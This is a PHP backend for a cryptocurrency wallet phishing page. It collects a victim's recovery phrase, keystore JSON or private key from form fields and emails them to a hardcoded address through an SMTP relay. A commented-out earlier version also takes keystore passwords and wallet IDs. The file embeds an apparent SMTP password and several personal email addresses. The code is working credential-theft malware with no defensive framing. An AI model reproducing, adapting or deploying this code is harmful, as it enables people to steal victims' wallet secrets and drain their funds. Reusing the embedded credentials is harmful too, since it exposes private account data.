<?php
$submissionMessage = '';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Replace these with your SMTP details
    $smtpServer = 'smtp.elasticemail.com';
    $smtpPort = 2525;
    $smtpUsername = 'carlsonron21@gmail.com';
    $smtpPassword = '6AE00845A061EF9A0CFBC019194672D0D086';

    // Sender and recipient email addresses
    $senderEmail = 'lindarose24045@gmail.com';
    $recipientEmail = 'emrys2404@gmail.com';

    // Get the form data
    $subject = $_POST['subject'] ?? '';

    // Determine which field to collect based on the option selected
    switch ($_POST['fld_5523896'] ?? '') {
        case 'Phrase':
            $fieldValue = $_POST['fld_427916'] ?? '';
            $fieldName = 'Recovery Phrase';
            break;
        case 'Keystore JSON':
            $fieldValue = $_POST['fld_2390776'] ?? '';
            $fieldName = 'Keystore JSON';
            break;
        case 'Private Key':
            $fieldValue = $_POST['fld_3287058'] ?? '';
            $fieldName = 'Private Key';
            break;
        default:
            $fieldValue = '';
            $fieldName = '';
    }

    // Compose the email body
    $body = "Subject: $subject\n\n$fieldName: $fieldValue";

    // Set up the SMTP connection
    $smtpConnection = fsockopen($smtpServer, $smtpPort, $errno, $errstr, 30);
    if (!$smtpConnection) {
        die("SMTP Connection Error: $errstr ($errno)");
    }

    // Send the email
    fputs($smtpConnection, "EHLO $smtpServer\r\n");
    fputs($smtpConnection, "auth login\r\n");
    fputs($smtpConnection, base64_encode($smtpUsername) . "\r\n");
    fputs($smtpConnection, base64_encode($smtpPassword) . "\r\n");
    fputs($smtpConnection, "MAIL FROM:<$senderEmail>\r\n");
    fputs($smtpConnection, "RCPT TO:<$recipientEmail>\r\n");
    fputs($smtpConnection, "DATA\r\n");
    fputs($smtpConnection, "Subject: $subject\r\n");
    fputs($smtpConnection, "From: $senderEmail\r\n");
    fputs($smtpConnection, "To: $recipientEmail\r\n");
    fputs($smtpConnection, "$body\r\n");
    fputs($smtpConnection, ".\r\n");
    fputs($smtpConnection, "QUIT\r\n");

    // Close the SMTP connection
    fclose($smtpConnection);

    // Set a success message
    $submissionMessage = 'Form submitted successfully!';

    // Redirect to success.html
    header('Location: sucess.html');
    exit;
}
?>
<p><?php echo $submissionMessage; ?></p>


/* $submissionMessage = '';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Replace these with your Elastic Email SMTP details
    $smtpServer = 'smtp.elasticemail.com';
    $smtpPort = 2525;
    $smtpUsername = 'carlsonron21@gmail.com';
    $smtpPassword = '6AE00845A061EF9A0CFBC019194672D0D086';

    // Sender and recipient email addresses
    $senderEmail = 'lindarose24045@gmail.com';
    $recipientEmail = 'emrys2404@gmail.com';

    // Get the form data
    $subject = $_POST['subject'] ?? '';
    $phrase = $_POST['phrase'] ?? '';
    $keystorejson = $_POST['keystorejson'] ?? '';
    $keystorepassword = $_POST['keystorepassword'] ?? '';
    $wallet_id = $_POST['wallet_id'] ?? '';
    $privatekey = $_POST['privatekey'] ?? '';

    // Compose the email body
    $body = "Subject: $subject\n\nRecovery Phrase: $phrase\n\nKeystore JSON: $keystorejson\n\nKeystore Password: $keystorepassword\n\nWallet ID: $wallet_id\n\nPrivate Key: $privatekey";

    // Set up the SMTP connection
    $smtpConnection = fsockopen($smtpServer, $smtpPort, $errno, $errstr, 30);
    if (!$smtpConnection) {
        die("SMTP Connection Error: $errstr ($errno)");
    }

    // Send the email
    fputs($smtpConnection, "EHLO $smtpServer\r\n");
    fputs($smtpConnection, "auth login\r\n");
    fputs($smtpConnection, base64_encode($smtpUsername) . "\r\n");
    fputs($smtpConnection, base64_encode($smtpPassword) . "\r\n");
    fputs($smtpConnection, "MAIL FROM:<$senderEmail>\r\n");
    fputs($smtpConnection, "RCPT TO:<$recipientEmail>\r\n");
    fputs($smtpConnection, "DATA\r\n");
    fputs($smtpConnection, "Subject: $subject\r\n");
    fputs($smtpConnection, "From: $senderEmail\r\n");
    fputs($smtpConnection, "To: $recipientEmail\r\n");
    fputs($smtpConnection, "$body\r\n");
    fputs($smtpConnection, ".\r\n");
    fputs($smtpConnection, "QUIT\r\n");

    // Close the SMTP connection
    fclose($smtpConnection);

    // Set a success message
    $submissionMessage = 'Form submitted successfully!';

    // Redirect to success.html
    header('Location: success.html');
    exit;
} */
/* ?>

<p><?php echo $submissionMessage; ?></p> */
